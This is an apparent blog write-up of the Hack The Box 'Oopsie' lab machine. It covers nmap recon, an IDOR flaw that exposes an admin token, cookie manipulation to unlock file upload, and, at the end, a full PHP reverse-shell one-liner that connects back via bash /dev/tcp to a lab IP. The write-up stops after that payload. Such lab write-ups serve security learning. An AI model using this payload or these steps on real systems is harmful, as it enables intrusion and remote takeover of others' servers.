---
title: Hack The Box - Oopsie Writeup
categories: [CYBERSECURITY, PENTEST]
tags: [HTB, WEB, PATH-HIJACK, PRIVESC]
---
 # **Oopsie**
 
![Icon](/assets/img/Oopsie/icon.png)
## **Enumeration**

Initiate recon by **nmap** command:

![Nmap Scan Result](/assets/img/Oopsie/nmap.png)

 **Opened port**

- 22  ssh port
- 80 http port
  
After inspect the home page source code, we found an url that is use to login. Next we can login as guest.
  
  ![homepage|446](/assets/img/Oopsie/inspect_homepage.png)

## **Exploitation**
There is an IDOR vunerbility on web browser url that enable us to access admin's access token and username. 
![Nmap Scan Result|601](/assets/img/Oopsie/idor.png)


I used **cookie manipulation** to access some features that guest cannot. That feature is upload and it's worth to do upload an **PHP reverse shel**l.
![Nmap Scan Result|601](/assets/img/Oopsie/upload.png)

![Icon](/assets/img/Oopsie/icon.pn

Here is my PHP reverse shell that i use:```<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.87/4444 0>&1'"); ?>```